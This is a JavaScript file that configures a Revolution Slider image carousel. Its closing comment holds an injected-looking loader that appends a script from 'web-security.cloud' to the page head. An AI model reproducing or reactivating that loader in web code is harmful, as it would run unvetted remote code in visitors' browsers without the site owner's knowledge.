					var tpj=jQuery;					
					var revapi116;
					tpj(document).ready(function() {
						if(tpj("#rev_slider_4_1").revolution == undefined){
							revslider_showDoubleJqueryError("#rev_slider_4_1");
						}else{
							revapi116 = tpj("#rev_slider_4_1").show().revolution({
								sliderType:"standard",
								jsFileLocation:"../revolution/js/",
								sliderLayout:"auto",
								dottedOverlay:"none",
								delay:9000,
								navigation: {
									keyboardNavigation: "on",
									keyboard_direction: "horizontal",
									mouseScrollNavigation: "off",
									onHoverStop: "off",
									touch: {
										touchenabled: "on",
										swipe_threshold: 75,
										swipe_min_touches: 1,
										swipe_direction: "horizontal",
										drag_block_vertical: false
									},
									arrows: {
										style: "hermes",
										enable: false,
										hide_onmobile: false,
										hide_onleave: false,
										tmp: '<div class="tp-arr-allwrapper">	<div class="tp-arr-imgholder"></div>	<div class="tp-arr-titleholder">{{title}}</div>	</div>',
										left: {
											h_align: "left",
											v_align: "center",
											h_offset: 10,
											v_offset: 0
										},
										right: {
											h_align: "right",
											v_align: "center",
											h_offset: 10,
											v_offset: 0
										}
									},
									bullets: {
										style:"round",
										enable:true,
										container:"slider",
										rtl:false,
										hide_onmobile:false,
										hide_onleave:false,
										hide_delay:200,
										hide_delay_mobile:1200,
										hide_under:0,
										hide_over:9999,
										direction:"horizontal",
										h_align:"center",
										v_align:"center",
										h_offset:0,
										v_offset:290,
										tmp:'<span class="tp-bullet-image"></span><span class="tp-bullet-title"></span>'
									}
								},
								viewPort: {
									enable:true,
									outof:"pause",
									visible_area:"80%"
								},
								gridwidth:1600,
								gridheight:1152,
								lazyType:"none",
								parallax: {
									type:"mouse",
									origo:"slidercenter",
									speed:2000,
									levels:[2,3,4,5,6,7,12,16,10,50],
								},
								shadow:0,
								spinner:"off",
								stopLoop:"off",
								stopAfterLoops:-1,
								stopAtSlide:-1,
								shuffle:"off",
								autoHeight:"off",
								hideThumbsOnMobile:"off",
								hideSliderAtLimit:0,
								hideCaptionAtLimit:0,
								hideAllCaptionAtLilmit:0,
								debugMode:false,
								fallbacks: {
									simplifyAll:"off",
									nextSlideOnWindowFocus:"off",
									disableFocusListener:false,
								}
							});
				}
			});	/*ready*/

/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/